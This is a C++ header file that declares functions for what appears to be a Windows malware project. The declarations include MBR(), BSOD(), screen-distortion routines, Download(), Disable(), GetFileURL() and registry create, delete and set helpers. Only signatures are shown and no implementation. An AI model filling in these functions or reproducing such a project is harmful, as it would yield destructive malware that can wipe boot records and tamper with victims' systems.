#include <string>
using namespace std;

#ifndef MBR_H
#define MBR_H
void MBR();
#endif

#ifndef BSOD_H
#define BSOD_H
void BSOD();
#endif

#ifndef TEXTBOX_H
#define TEXTBOX_H
void TextO(LPCWSTR lpText);
#endif

#ifndef ICONS_H
#define ICONS_H
void Icons();
#endif

#ifndef SQUARE_H
#define SQUARE_H
void Square(int red, int green, int blue);
#endif

#ifndef MELT_H
#define MELT_H
void Melt();
#endif

#ifndef INVERSION_H
#define INVERSION_H
void Inversion();
#endif

#ifndef DOWNLOAD_H
#define DOWNLOAD_H
void Download();
#endif

#ifndef DISABLE_H
#define DISABLE_H
void Disable();
#endif

#ifndef GETURL_H
#define GETURL_H
void GetFileURL(const wchar_t* URL, const wchar_t* patch);
#endif

#ifndef CRK_H
#define CRK_H
void CRK(HKEY key, wstring path, wstring name);
#endif

#ifndef DRK_H
#define DRK_H
void DRK(HKEY key, wstring path, wstring name);
#endif

#ifndef SRV_H
#define SRV_H
void SRV(HKEY key, wstring path, wstring name, wstring value);
#endif
